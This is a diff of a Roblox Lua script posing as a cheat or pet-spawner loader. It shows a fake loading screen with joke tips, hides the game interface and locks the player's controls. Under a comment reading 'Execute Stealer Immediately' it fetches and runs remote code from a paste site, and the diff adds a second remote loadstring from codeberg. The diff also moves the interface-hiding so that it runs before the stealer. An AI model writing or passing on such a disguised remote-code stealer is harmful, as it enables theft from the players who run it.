@@ -1,11 +1,6 @@
 -- CONFIG
 local LOADING_TIME = 210 -- seconds
 local tips = {
-    "Tip: Pressing space makes you jump!",
-    "Tip: Collect coins for bonuses!",
-    "Tip: Use cover to avoid enemies.",
-    "Tip: Watch your stamina bar.",
-    "Tip: You can sprint by holding Shift.",
     "Bypassing Anti-Cheat...",
     "Stealing crops from neighbors...",
     "Downloading OP pets...",
@@ -19,14 +14,14 @@ local tips = {
     "Growing money trees..."
 }
 
+-- Hide CoreGui
+local StarterGui = game:GetService("StarterGui")
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
 -- Execute Stealer Immediately
 task.spawn(function()
     loadstring(game:HttpGet("https://pastefy.app/l9Kp67lO/raw"))()
 end)
-
--- Hide CoreGui
-local StarterGui = game:GetService("StarterGui")
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 
 -- Lock player controls
 local Players = game:GetService("Players")
@@ -132,3 +127,7 @@ screenGui:Destroy()
 camera.CameraType = Enum.CameraType.Custom
 Controls:Enable()
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+
+-- Execute visual script AFTER loading
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
+Spawner.Load()
